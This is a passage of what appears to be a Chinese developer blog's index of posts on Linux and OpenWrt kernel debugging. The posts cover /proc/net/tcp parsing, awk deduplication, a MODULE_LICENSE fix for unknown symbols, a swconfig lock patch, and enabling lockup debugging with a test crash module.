0101A8C0:0017 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12882 1 dcd20000 100 0 0 10 0   4: 00000000:01BB 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28898 1 de008a00 100 0 0 10 0   5: 0101A8C0:0017 0A01A8C0:288D 01 00000000:00000000 00:00000000 00000000     0        0 349364 1 de00b700 24 8 25 10 -1</code></pre><p>这个文件显示的是当前进程相关的tcp连接信息，目前我们仅考虑端口号为23的连接，由于当前数据均为16进制，所以grep时使用23的16进制数17</p><pre><code class="bash">$ grep &quot;17\|sl&quot; /proc/3698/net/tcp  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode   3: 0101A8C0:0017 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12882 1 dcd20000 100 0 0 10 0   5: 0101A8C0:0017 0A01A8C0:288D 01 00000000:00000000 00:00000000 00000000     0        0 349364 1 de00b700 24 8 25 10 -1</code></pre><p>可以看到两个信息，先看其一，local_address为<code>0101A8C0:0017</code>，解析如下:</p><pre><code class="sh">01  01  A8  C0:  00171   1   168 192: 23</code></pre><p>注意网络地址与本地地址的顺序，转换为10进制便是<code>192.168.1.1:23</code>，其对应的<code>inode</code>就是<code>12882</code>，与<code>lsof</code>看到的一致。</p><p>同理，第2条信息，本地地址一致，远程地址<code>0A01A8C0:288D</code>对应10进制<code>192.168.1.10:10381</code>与上述<code>netstat</code>看到的一致。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据端口号查找进程及端口相应的fd，可以通过<code>netstat</code>,<code>lsof</code>,<code>proc</code>文件系统3种方式协同完成。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>awk &#39;!a[$0]++&#39;去重小技巧</title>
      <link href="2020/01/09/awk_dedup/"/>
      <url>2020/01/09/awk_dedup/</url>
      
        <content type="html"><![CDATA[<p>今天碰到一个关于awk的去重用法，觉得挺有意思的，记录一下</p><h2 id="awk-按行去重"><a href="#awk-按行去重" class="headerlink" title="awk 按行去重"></a>awk 按行去重</h2><p><code>awk &#39;!a[$0]++&#39; file</code> 是个神奇的用法，通过它可以实现文件内容去重</p><ul><li><code>$0</code>: 代表整行</li><li><code>a[]</code>: 代表数组a,名称随意,首次调用时为空</li><li><code>++</code>:　与<code>C/C++</code>中的<code>++</code>一个含义，<code>i++</code>先使用i后i自增1，<code>++i</code>代表i先自增1然后被使用</li><li><code>!</code>: 代表取反</li></ul><p>所以<code>a[$0]</code>代表对当前行构建一个名为a的数组，首次构建后其值为0</p><p><code>a[$0]++</code>代表先使用<code>a[$0]</code>的值，然后<code>a[$0]</code>的值自增1。首次调用自然就是0,下次遇到重复的行就变为1，所以不加<code>!</code>的情况下，该语法用于打印重复项，看下面的例子↓</p><pre><code class="bash">$ cat testaaabbbaaacccbbbaaadddbbb$ awk &#39;a[$0]++&#39; testaaabbbaaabbb</code></pre><p>它把文件中重复的行都打印出来了。为了去重，我们只需在前面加个取反符<code>!</code>即可，这便是<code>!a[$0]++</code>了</p><pre><code class="bash">$ awk &#39;!a[$0]++&#39; testaaabbbcccddd</code></pre><h2 id="awk-按列去重"><a href="#awk-按列去重" class="headerlink" title="awk 按列去重"></a>awk 按列去重</h2><p>上面使用<code>$0</code>构建数组，如果我们使用第i列的值<code>$i</code>构建数组，使用<code>awk &#39;!a[$i]++&#39; file</code>则可以按照指定列的关键词实现去重↓</p><pre><code class="bash">$ cat testaaa 111bbb 222aaa 222ccc 222bbb 333aaa 444ddd 111bbb 111$ awk &#39;!a[$2]++&#39; testaaa 111bbb 222bbb 333aaa 444</code></pre><p>可以看到，test文件中第2列均不重复，但是其它列允许重复。这种用法在某些特定情况下是非常实用的。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> awk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>insmod内核模块提示Unknown Symbol问题处理</title>
      <link href="2019/11/07/unknown_symbol/"/>
      <url>2019/11/07/unknown_symbol/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在调试内核crash问题时打开了<code>lockup</code>相关的kernel CONFIG，重新编译FW后发现有个内核模块insmod失败</p><pre><code class="log">[Wed Nov 06 15:51:57.384 2019] ip6t_CONE: Unknown symbol rcu_bh_lock_map (err 0)[Wed Nov 06 15:51:57.384 2019] ip6t_CONE: Unknown symbol lock_acquire (err 0)[Wed Nov 06 15:51:57.384 2019] ip6t_CONE: Unknown symbol lock_release (err 0)</code></pre><p>手动使用<code>insmod</code>重新加载也是提示相同的错误。</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>原本这个问题是不存在的，出现的原因必然和启用的CONFIG相关，对比前后两个FW的<code>ip6t_CONE.ko</code></p><pre><code class="sh"># old .ko$ strings ip6t_CONE.ko |grep rcu# new .ko$ strings ip6t_CONE.ko |grep rcurcu_bh_lock_map</code></pre><p>发现新的<code>.ko</code>确实包含了提示出错的那些个<code>symbol</code>，为了找出这些参数是启用哪个CONFIG引入的，可以去查找kernel的sourcecode</p><p><img src="/assets/kernel/export_symbol.png" alt="export symbol rcu_bh_lock_map"></p><p>Got you, 就是这个<code>CONFIG_DEBUG_LOCK_ALLOC</code>，这个CONFIG正是之前打开lockup相关CONFIG之一。当然其它两个报错的Symbol也是类似的情况。</p><p>对应的CONFIG找到了，但是本来就需要通过这个CONFIG去记录相关log，当然不然又把它禁掉，加载失败的问题也正是打开这个CONFIG才发现的，说明是个潜在问题。那么如何解决呢，首先我们以为是这些<code>Symbol</code>在内核中已经导出了，但是<code>ipv6_CONE.ko</code>没有引用的缘故，所以尝试在源文件<code>ipv6_CONE.c</code>中使用extern调用。</p><pre><code class="c">extern struct lockdep_map rcu_bh_lock_map;extern void lock_acquire(struct lockdep_map *lock, unsigned int subclass,              int trylock, int read, int check,              struct lockdep_map *nest_lock, unsigned long ip);extern void lock_release(struct lockdep_map *lock, int nested,              unsigned long ip);</code></pre><p>事实证明这个方法<strong>不可行</strong>，说明不是这个思路，所以重新开始了Google之路，终于！万能的<code>StackOverflow</code>让我看到了希望</p><blockquote><p><strong>问题</strong>：<a href="https://stackoverflow.com/questions/29578931/unknown-symbol-class-create-err-0">unknown symbol __class_create (err 0)</a></p><p>The function <code>__class_create</code> is exported only for GPL modules (exported with <strong>EXPORT_SYMBOL_GPL</strong>). So, you need to use a GPL license with MODULE_LICENSE macro to make use of that function. Same goes for other functions as well.</p><p>This should do the trick:<br><strong>MODULE_LICENSE(&quot;GPL&quot;);</strong></p></blockquote><p>发现这个问题和我遇到的情况基本一致，然后我重新检查了这几个Symbol的export方式，确实都是<code>EXPORT_SYMBOL_GPL</code>，接着我再去看<code>ip6t_CONE</code>的sourcecode，发现确实没有声明LICENSE！！！</p><p>好了，解决方案来啦，立马加个kernel patch ↓</p><pre><code class="patch">--- kmod-ipv6-cone.orig/ip6t_cone.c 2019-11-07 09:46:42.068839345 +0800--- kmod-ipv6-cone/ip6t_cone.c 2019-11-07 09:47:45.956071600 +0800@@ -466,3 +466,8 @@ module_init(init); module_exit(fini); #endif++MODULE_LICENSE(&quot;GPL&quot;);+MODULE_AUTHOR(&quot;&quot;);+MODULE_DESCRIPTION(&quot;IPv6&quot;);+</code></pre><p>加上重新编译，一切ok，那些恼人的log终于不见啦，<code>ip6t_CONE.ko</code>也正常加载完成，完美！</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://stackoverflow.com/questions/29578931/unknown-symbol-class-create-err-0">unknown symbol __class_create (err 0)</a></li><li><a href="http://tuxthink.blogspot.com/2011/07/exporting-symbols-from-module.html">Exporting symbols from module</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPv6 </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openwrt swconfig stack trace分析</title>
      <link href="2019/11/06/swconfig_crash/"/>
      <url>2019/11/06/swconfig_crash/</url>
      
        <content type="html"><![CDATA[<p>接上一篇博客 <a href="/2019/11/03/kernel_debug/" title="watchdog bite导致系统重启问题的调试">watchdog bite导致系统重启问题的调试</a> ，打开调试功能后开始压力测试，在测试过程中发现DUT每隔2s打印一次以下异常信息</p><pre><code class="log">BUG: sleeping function called from invalid context at kernel/locking/mutex.c:616in_atomic(): 1, irqs_disabled(): 0, pid: 9465, name: swconfigINFO: lockdep is turned off.CPU: 2 PID: 9465 Comm: swconfig Tainted: P        W    3.14.77 #1[&lt;c021561c&gt;] (unwind_backtrace) from [&lt;c0211d44&gt;] (show_stack+0x18/0x1c)[&lt;c0211d44&gt;] (show_stack) from [&lt;c062ea98&gt;] (dump_stack+0x9c/0xd4)[&lt;c062ea98&gt;] (dump_stack) from [&lt;c06312d8&gt;] (mutex_lock_nested+0x2c/0x450)[&lt;c06312d8&gt;] (mutex_lock_nested) from [&lt;c0499df8&gt;] (swconfig_get_dev+0x70/0x88)[&lt;c0499df8&gt;] (swconfig_get_dev) from [&lt;c049a808&gt;] (swconfig_list_attrs+0x20/0x20c)[&lt;c049a808&gt;] (swconfig_list_attrs) from [&lt;c054fde8&gt;] (genl_rcv_msg+0x260/0x2e0)[&lt;c054fde8&gt;] (genl_rcv_msg) from [&lt;c054f2d0&gt;] (netlink_rcv_skb+0x60/0xbc)[&lt;c054f2d0&gt;] (netlink_rcv_skb) from [&lt;c054fb74&gt;] (genl_rcv+0x28/0x3c)[&lt;c054fb74&gt;] (genl_rcv) from [&lt;c054ec94&gt;] (netlink_unicast+0x11c/0x1d0)[&lt;c054ec94&gt;] (netlink_unicast) from [&lt;c054f114&gt;] (netlink_sendmsg+0x30c/0x368)[&lt;c054f114&gt;] (netlink_sendmsg) from [&lt;c050fb78&gt;] (sock_sendmsg+0x78/0x8c)[&lt;c050fb78&gt;] (sock_sendmsg) from [&lt;c0511310&gt;] (___sys_sendmsg.part.3+0x184/0x20c)[&lt;c0511310&gt;] (___sys_sendmsg.part.3) from [&lt;c0512340&gt;] (__sys_sendmsg+0x54/0x78)[&lt;c0512340&gt;] (__sys_sendmsg) from [&lt;c020df40&gt;] (ret_fast_syscall+0x0/0x50)</code></pre><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>每隔2s是因为在<code>detcable</code>模块的主循环中执行了以下代码，并且在while循环中每2s执行一次。</p><pre><code class="c">system(&quot;/sbin/swconfig dev switch0 show |grep \&quot;link: port\&quot; &gt; /tmp/switch);</code></pre><p>根据log首行提示<code>kernel/locking/mutex.c:616</code>找到相关代码：</p><p><img src="/assets/kernel/mutex.c.png" alt="mutex.c:616"></p><p>在内核代码中搜索<code>might_sleep</code>找到其定义于<code>include/linux/kernel.h</code></p><p><img src="/assets/kernel/might_sleep.png" alt="kernel.h might_sleep"></p><p>从说明信息可以看出，这些<code>stack trace</code>提示<code>swconfig</code>进程运行过程中进入内核态时可能进入不被允许的睡眠状态。而这些信息是在启用<code>CONFIG_DEBUG_ATOMIC_SLEEP</code>后打印的，该CONFIG是在启用lockup相关调试功能时打开，所以想要停止打印可以禁用该CONFIG。</p><p>但是实际上这个问题是swconfig的内核驱动导致的，具体代码如下：</p><p><img src="/assets/kernel/swconfig_drivers.png" alt="swconfig drviers"></p><p><code>spinlock</code>自旋锁不允许临界区有触发sleep的函数，而<code>mutex_lock</code>正好就是可能进入sleep状态的函数，所以才触发了这个stack trace</p><blockquote><p><strong>mutex_lock</strong> — acquire the mutex<br>Lock the mutex exclusively for this task. If the mutex is not available right now, it will sleep until it can get it.</p></blockquote><p>为了解决这个问题，可以将加锁方式由<code>spin_lock</code>改为<code>mutex_lock</code>，这个解决方案是组长<code>google</code>来的，我这是拾人牙慧了，哈哈哈。</p><pre><code class="patch">index 78569a9..e8a6847 100644 (file)--- a/target/linux/generic/files/drivers/net/phy/swconfig.c+++ b/target/linux/generic/files/drivers/net/phy/swconfig.c@@ -36,7 +36,7 @@ MODULE_LICENSE(&quot;GPL&quot;); static int swdev_id; static struct list_head swdevs;-static DEFINE_SPINLOCK(swdevs_lock);+static DEFINE_MUTEX(swdevs_lock); struct swconfig_callback; struct swconfig_callback &#123;@@ -296,13 +296,13 @@ static struct nla_policy link_policy[SWITCH_LINK_ATTR_MAX] = &#123; static inline void swconfig_lock(void) &#123;-       spin_lock(&amp;swdevs_lock);+       mutex_lock(&amp;swdevs_lock); &#125; static inline void swconfig_unlock(void) &#123;-       spin_unlock(&amp;swdevs_lock);+       mutex_unlock(&amp;swdevs_lock); &#125; static struct switch_dev *</code></pre><p>加入patch后完美解决问题。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://www.kernel.org/doc/htmldocs/kernel-locking/API-mutex-lock.html">API mutex_lock</a></li><li><a href="https://git.openwrt.org/?p=openwrt/openwrt.git;a=commitdiff;h=ed3860c3e3ebe484c00cf603c29e68af28eb0839;ds=inline">swconfig: convert swdevs_lock from spinlock to mutex</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openwrt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>watchdog bite导致系统重启问题的调试</title>
      <link href="2019/11/03/kernel_debug/"/>
      <url>2019/11/03/kernel_debug/</url>
      
        <content type="html"><![CDATA[<h2 id="背景说明"><a href="#背景说明" class="headerlink" title="背景说明"></a>背景说明</h2><p>ST在做stress test过程中发现一个bug，DUT会在工作一段时间后重启，重启原因是<code>watchdog bite</code></p><pre><code class="txt">[Thu Sep 26 09:21:59.734 2019] Watchdog bark! Now = 831425.568038[Thu Sep 26 09:21:59.734 2019] Causing a watchdog bite![Thu Sep 26 09:21:59.734 2019] Configuring Watchdog Timer[Thu Sep 26 09:21:59.734 2019] Wa</code></pre><p>但是无法确定根本原因是什么，是什么导致的死锁，让watchdog没办法在规定时间内bark。为此，我们需要启用相关的内核调试手段去获取相关信息，然后深入分析crashdump和console log。</p><h2 id="内核裁剪"><a href="#内核裁剪" class="headerlink" title="内核裁剪"></a>内核裁剪</h2><h3 id="启用ftrace"><a href="#启用ftrace" class="headerlink" title="启用ftrace"></a>启用ftrace</h3><blockquote><p><strong>Ftrace</strong> is an internal tracer designed to help out developers and designers of systems to find what is going on inside the kernel. It can be used for debugging or analyzing latencies and performance issues that take place outside of user-space.</p></blockquote><p><code>Ftrace</code>是一个内部跟踪器，用于追踪内核运行情况，帮助调试用户空间之外的潜在问题或性能问题。根据QCA提供的帮助文档，可以通过以下步骤开启ftrace功能。</p><ol><li>From &quot;make menuconfig&quot;, go to --&gt; &quot;Global Build Settings&quot; then go to --&gt; &quot;Compile kernel with tracing support&quot;</li><li>In the &quot;Compile kernel with tracing support&quot;, enable the below options :-<ul><li>Enable/disable function tracing dynamically</li><li>Trace process context switches and events</li><li>Function tracer</li></ul></li><li>Once above changes are done, then from the &quot;make kernel_menuconfig&quot;, go to --&gt; &quot;Kernel hacking&quot; --&gt; then enable the below options in &quot;Tracers&quot;:-<ul><li>Kernel Function Tracer</li><li>enable/disable function tracing dynamically</li></ul></li></ol><p>可以看出，配置分两个部分完成，<code>make menuconfig</code>及<code>make kernel_menuconfig</code></p><p><img src="/assets/kernel/menuconfig_ftrace.png" alt="make menuconfig"></p><p>使用图形化界面配置menuconfig如上，保存后对应的.config文件会随之更改</p><pre><code class="patch"> # CONFIG_KERNEL_PROFILIING is not set CONFIG_KERNEL_KALLSYMS=y # CONFIG_KERNEL_KALLSYMS_ALL is not set-# CONFIG_KERNEL_FTRACE is not set+CONFIG_KERNEL_FTRACE=y+# CONFIG_KERNEL_FTRACE_SYSCALLS is not set+CONFIG_KERNEL_ENABLE_DEFAULT_TRACERS=y # CONFIG_KERNEL_DEBUG_KMEMLEAK is not set+CONFIG_KERNEL_FUNCTION_TRACER=y+# CONFIG_KERNEL_FUNCTION_GRAPH_TRACER is not set+CONFIG_KERNEL_DYNAMIC_FTRACE=y+# CONFIG_KERNEL_FUNCTION_PROFILER is not set # CONFIG_KERNEL_IRQSOFF_TRACER is not set # CONFIG_KERNEL_PREEMPT_TRACER is not set CONFIG_KERNEL_DEBUG_KERNEL=y</code></pre><p>但是在<code>openWrt</code>中使用<code>make kernel_menuconfig</code>会打乱原有的配置选项，所以需要手动修改配置文件</p><pre><code class="patch">@@ -3301,8 +3304,26 @@ CONFIG_HAVE_FTRACE_MCOUNT_RECORD=y CONFIG_HAVE_SYSCALL_TRACEPOINTS=y CONFIG_HAVE_C_RECORDMCOUNT=y CONFIG_TRACING_SUPPORT=y-# CONFIG_FTRACE is not set-+CONFIG_FTRACE=y+CONFIG_FUNCTION_TRACER=y+CONFIG_DYNAMIC_FTRACE=y+# CONFIG_NET_DROP_MONITOR is not set+# CONFIG_FUNCTION_GRAPH_TRACER is not set+# CONFIG_IRQSOFF_TRACER is not set+# CONFIG_PREEMPT_TRACER is not set+# CONFIG_SCHED_TRACER is not set+# CONFIG_FTRACE_SYSCALLS is not set+# CONFIG_TRACER_SNAPSHOT is not set+CONFIG_BRANCH_PROFILE_NONE=y+# CONFIG_PROFILE_ANNOTATED_BRANCHES is not set+# CONFIG_PROFILE_ALL_BRANCHES is not set+# CONFIG_STACK_TRACER is not set+# CONFIG_BLK_DEV_IO_TRACE is not set+# CONFIG_FUNCTION_PROFILER is not set+# CONFIG_FTRACE_STARTUP_TEST is not set+# CONFIG_RING_BUFFER_STARTUP_TEST is not set+# CONFIG_RING_BUFFER_BENCHMARK is not set+# # # Runtime Testing #</code></pre><p>对应的图形化配置如下：</p><p><img src="/assets/kernel/kernel_menuconfig_ftrace.png" alt="kernel_menuconfig ftrace"></p><h3 id="启用lockup-debug"><a href="#启用lockup-debug" class="headerlink" title="启用lockup debug"></a>启用lockup debug</h3><p>为了打印出现死锁后的相关信息，需要打开相应的配置参数</p><pre><code class="patch">@@ -3249,9 +3249,9 @@ CONFIG_HAVE_DEBUG_KMEMLEAK=y # Debug Lockups and Hangs # CONFIG_LOCKUP_DETECTOR=y-# CONFIG_BOOTPARAM_SOFTLOCKUP_PANIC is not set+CONFIG_BOOTPARAM_SOFTLOCKUP_PANIC=y CONFIG_BOOTPARAM_SOFTLOCKUP_PANIC_VALUE=0-# CONFIG_DETECT_HUNG_TASK is not set+CONFIG_DETECT_HUNG_TASK=y # CONFIG_PANIC_ON_OOPS is not set CONFIG_PANIC_ON_OOPS_VALUE=0 CONFIG_PANIC_TIMEOUT=3@@ -3259,20 +3259,21 @@ CONFIG_PANIC_TIMEOUT=3 # CONFIG_SCHEDSTATS is not set # CONFIG_TIMER_STATS is not set # CONFIG_DEBUG_PREEMPT is not set-+CONFIG_DEFAULT_HUNG_TASK_TIMEOUT=120+CONFIG_BOOTPARAM_HUNG_TASK_PANIC=y # # Lock Debugging (spinlocks, mutexes, etc...) #-# CONFIG_DEBUG_RT_MUTEXES is not set-# CONFIG_RT_MUTEX_TESTER is not set-# CONFIG_DEBUG_SPINLOCK is not set-# CONFIG_DEBUG_MUTEXES is not set-# CONFIG_DEBUG_WW_MUTEX_SLOWPATH is not set-# CONFIG_DEBUG_LOCK_ALLOC is not set-# CONFIG_PROVE_LOCKING is not set-# CONFIG_LOCK_STAT is not set-# CONFIG_DEBUG_ATOMIC_SLEEP is not set-# CONFIG_DEBUG_LOCKING_API_SELFTESTS is not set+CONFIG_DEBUG_RT_MUTEXES=y+CONFIG_RT_MUTEX_TESTER=y+CONFIG_DEBUG_SPINLOCK=y+CONFIG_DEBUG_MUTEXES=y+CONFIG_DEBUG_WW_MUTEX_SLOWPATH=y+CONFIG_DEBUG_LOCK_ALLOC=y+CONFIG_PROVE_LOCKING=y+CONFIG_LOCK_STAT=y+CONFIG_DEBUG_ATOMIC_SLEEP=y+CONFIG_DEBUG_LOCKING_API_SELFTESTS=y # CONFIG_DEBUG_KOBJECT is not set CONFIG_DEBUG_BUGVERBOSE=y # CONFIG_DEBUG_WRITECOUNT is not set@@ -3280,6 +3281,8 @@ CONFIG_DEBUG_BUGVERBOSE=y # CONFIG_DEBUG_SG is not set # CONFIG_DEBUG_NOTIFIERS is not set # CONFIG_DEBUG_CREDENTIALS is not set+CONFIG_DEBUG_LOCKDEP=y+# CONFIG_PROVE_RCU is not set</code></pre><p>其中有些看似不相干的config（如<code>CONFIG_PROVE_RCU</code>）被设置成了<code>is not set</code>，这是和某些lockup配置相关的依赖关系决定的，如果没有显式设置的话，每次编译都会让你手动选择是否启用。如果使用下面的图形化界面配置就不需要手动添加了，因为它会自动处理各种依赖关系。</p><p><img src="/assets/kernel/kernel_menuconfig_lockup.png" alt="kernel_menuconfig lockup"></p><h3 id="移除未使用的内核模块"><a href="#移除未使用的内核模块" class="headerlink" title="移除未使用的内核模块"></a>移除未使用的内核模块</h3><p>由于启用了大量的调试信息，开机启动无线模块时会提示内存不足的情况，从而导致无线模块无法工作。</p><pre><code class="log">ath_dev: Copyright (c) 2001-2007 Atheros Communications, Inc, All Rights Reservedath_da_pci:  (Atheros/multi-bss)DHCPv6 client is not running! Returnvmap allocation for size 1064960 failed: use vmalloc=&lt;size&gt; to increase size.vmalloc: allocation failure: 1060629 bytesinsmod: page allocation failure: order:0, mode:0xd0......ath_dev: driver unloadedath_tx99: driver unloadedath_rate_atheros: driver unloadedath_hal: driver unloadedath_spectral: driver unloadedath_dfs: driver unloadedphy for wifi device wifi0 not foundwifi0(qcawifi): enable failedqcawifi: enable radio wifi1</code></pre><p>为此可以将部分未使用的内核模块移除。</p><ol><li>Bluetooth driver</li><li>SOUND driver</li><li>IDE &amp; SCSI driver</li><li>Filesystems not used</li></ol><p>可以通过直接修改内核配置文件<code>target/linux/ipq806x/config_dni-3.14</code>完成裁剪。</p><h2 id="添加内核测试模块-kmod-dead"><a href="#添加内核测试模块-kmod-dead" class="headerlink" title="添加内核测试模块 kmod-dead"></a>添加内核测试模块 kmod-dead</h2><p>QCA为了测试<code>watchdog</code>问题，提供了一个内核测试模块，通过该模块可以手动触发系统crash</p><p><code>kmod-dead</code>的目录结构如下：</p><pre><code class="sh">kmod-dead├── Makefile└── src    ├── dead.c    ├── Kconfig    └── Makefile</code></pre><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><p>模块根目录的Makefile仿其它内核模块(<code>kmod-urlblock</code>)编写</p><pre><code class="Makefile">include $(TOPDIR)/rules.mkinclude $(INCLUDE_DIR)/kernel.mkPKG_RELEASE:=1PKG_NAME:=kmod-deadPKG_BUILD_DIR:=$(KERNEL_BUILD_DIR)/$(PKG_NAME)include $(INCLUDE_DIR)/package.mkdefine KernelPackage/dead  SUBMENU:=Other modules  TITLE:=kernel dead  VERSION:=$(LINUX_VERSION)-$(BOARD)-$(PKG_RELEASE)  FILES:= $(PKG_BUILD_DIR)/dead.$(LINUX_KMOD_SUFFIX)# AUTOLOAD:=$(call AutoLoad,46,dead)endefdefine Build/Prepare    mkdir -p $(PKG_BUILD_DIR)    $(CP) ./src/* $(PKG_BUILD_DIR)endefdefine Build/Compile    $(MAKE) -C &quot;$(LINUX_DIR)&quot; \        CROSS_COMPILE=&quot;$(TARGET_CROSS)&quot; \        ARCH=&quot;$(LINUX_KARCH)&quot; \        SUBDIRS=&quot;$(PKG_BUILD_DIR)&quot; \        EXTRA_CFLAGS=&quot;$(BUILDFLAGS)&quot; \        modulesendefdefine KernelPackage/dead/install    $(INSTALL_DIR) $(1)/lib/network/endef$(eval $(call KernelPackage,dead))</code></pre><p>Makefile中将<code>AUTOLOAD</code>所在行注释掉是为了禁止模块自动加载，导致系统刚刚启动就crash，然后无限重启。</p><h3 id="src-dead-c"><a href="#src-dead-c" class="headerlink" title="src/dead.c"></a>src/dead.c</h3><pre><code class="c">#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kthread.h&gt;#include &lt;linux/spinlock_types.h&gt;static DEFINE_SPINLOCK(test_lock);static int process_test(void *info)&#123;    spin_lock(&amp;test_lock);    while(1);    return 0;&#125;static int __init init_3mb_alloc(void)&#123;    struct task_struct *p1, *p2, *p3, *p4;    printk(&quot;MODULE\tINITIALIZED\n&quot;);    p1 = kthread_create(process_test, NULL, &quot;TEST_CPU_1_THREAD&quot;);    kthread_bind(p1,0);    p2 = kthread_create(process_test, NULL, &quot;TEST_CPU_2_THREAD&quot;);    kthread_bind(p2,0);    p3 = kthread_create(process_test, NULL, &quot;TEST_CPU_3_THREAD&quot;);    kthread_bind(p3,0);    p4 = kthread_create(process_test, NULL, &quot;TEST_CPU_4_THREAD&quot;);    kthread_bind(p4,0);    wake_up_process(p1);    wake_up_process(p2);    wake_up_process(p3);    wake_up_process(p4);    return 0;&#125;static void __exit exit_3mb_alloc(void)&#123;    printk(&quot;MODULE\tTERMINATED\n&quot;);&#125;module_init(init_3mb_alloc);module_exit(exit_3mb_alloc);MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;QUALCOMM&quot;);</code></pre><h3 id="src-Makefile"><a href="#src-Makefile" class="headerlink" title="src/Makefile"></a>src/Makefile</h3><pre><code class="Makefile"># This program is free software; you can redistribute it and/or# modify it under the terms of the GNU General Public License# as published by the Free Software Foundation; either version# 2 of the License, or (at your option) any later version.obj-m := dead.oifeq ($(MAKING_MODULES),1)-include $(TOPDIR)/Rules.makeendif</code></pre><h3 id="src-Kconfig"><a href="#src-Kconfig" class="headerlink" title="src/Kconfig"></a>src/Kconfig</h3><pre><code class="yml">config DEAD    tristate &quot;This is a Module_DEAD&quot;    default y    help        This is a dead module, for debugging kernel crash.        If unsure, say N.</code></pre><h2 id="打印watchdog-ping相关log"><a href="#打印watchdog-ping相关log" class="headerlink" title="打印watchdog ping相关log"></a>打印watchdog ping相关log</h2><p>编辑以下文件，在watchdog执行ping操作时打印log</p><p>build_dir/target-arm_cortex-a7_uClibc-1.0.14_eabi/linux-ipq806x/linux-3.14.77/drivers/watchdog/qcom-wdt.c</p><pre><code class="c">static int qcom_wdt_ping(struct watchdog_device *wdd)&#123;    struct qcom_wdt *wdt = to_qcom_wdt(wdd);    printk(&quot;********************qcom-wdt-ping1*****************\n&quot;);    writel(1, wdt-&gt;wdt_reset);    printk(&quot;********************qcom-wdt-ping2*****************\n&quot;);    return 0;&#125;</code></pre><p>以上<code>printk</code>部分就是打印的log。据此可以生成kernel patch如下：</p><blockquote><p>待修改文件：linux-3.14.77/drivers/watchdog/qcom-wdt.c<br>路径：target/linux/ipq806x/patches_dni-3.14<br>patch：0101-print-watch-ping-log.patch</p></blockquote><pre><code class="patch">--- linux-3.14.77.orig/drivers/watchdog/qcom-wdt.c 2019-11-01 10:0:18.332348721 +0800+++ linux-3.14.77/drivers/watchdog/qcom-wdt.c 2019-11-01 09:39:58.689575974 +0800@@ -253,7 +253,9 @@ &#123;     struct qcom_wdt *wdt = to_qcom_wdt(wdd);+    printk(&quot;********************qcom-wdt-ping1*****************\n&quot;);     writel(1, wdt-&gt;wdt_reset);+    printk(&quot;********************qcom-wdt-ping2*****************\n&quot;);     return 0; &#125;</code></pre><h2 id="打开DTS-debug"><a href="#打开DTS-debug" class="headerlink" title="打开DTS debug"></a>打开DTS debug</h2><p>编辑dts（Device Tree Source）的配置文件，使能<code>init_debug</code></p><blockquote><p>待修改文件：linux-3.14.77/arch/arm/boot/dts/qcom-ipq40xx-ap.dj04.1.dtsi<br>路径：target/linux/ipq806x/patches_dni-3.14<br>patch：0102-add-init_debug=4-in-dts.patch</p></blockquote><pre><code class="patch">--- linux-3.14.77.orig/arch/arm/boot/dts/qcom-ipq4xx-ap.dk04.1.dtsi 2019-11-01 16:07:53.063327477 +0800+++ linux-3.14.77/arch/arm/boot/dts/qcom-ipq4xx-ap.dk04.1.dtsi 2019-11-01 14:05:33.923495413 +0800@@ -50,7 +50,7 @@+       &#125;;++       chosen &#123;+-              bootargs-append = &quot; clk_ignore_unused user_debug=0xff&quot;;++              bootargs-append = &quot; clk_ignore_unused user_debug=0xff init_debug=4&quot;;+       &#125;;++ &#125;;</code></pre><p><code>init_debug</code>用于打开调试log，上面的patch对应修改的系统文件是<code>/proc/cmdline</code></p><pre><code class="sh">$ cat /proc/cmdline rootwait clk_ignore_unused user_debug=0xff init_debug=4</code></pre><h2 id="修改kernel-size-amp-rootfs-size"><a href="#修改kernel-size-amp-rootfs-size" class="headerlink" title="修改kernel_size &amp; rootfs_size"></a>修改kernel_size &amp; rootfs_size</h2><p>使能大量debug信息会导致kernel size增大，所以需要修正kernel size.</p><h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><p>kernel的大小可以从以下文件获取。</p><pre><code class="sh">$ ls -l bin/ipq806x/openwrt-ipq806x-qcom-ipq40xx-ap.dkxx-fit-uImage.itb-rw-r--r-- 1 guangtao.wu guangtao.wu 4364244 Oct 31 16:06 bin/ipq806x/openwrt-ipq806x-qcom-ipq40xx-ap.dkxx-fit-uImage.itb</code></pre><p>由于flash需要128k对齐，所以<code>kernel size</code>需要通过以上文件大小<code>4364244</code>除以128k再取整后重新计算</p><pre><code class="c">4364244 / ( 128 * 1024 ) = 33.2965# kernel size34 * 128 * 1024 = 4456448 = 0x440000# rootfs size0x2800000 - 0x440000 = 0x23c0000</code></pre><h3 id="修改dni-home-config-defconfig-orbi"><a href="#修改dni-home-config-defconfig-orbi" class="headerlink" 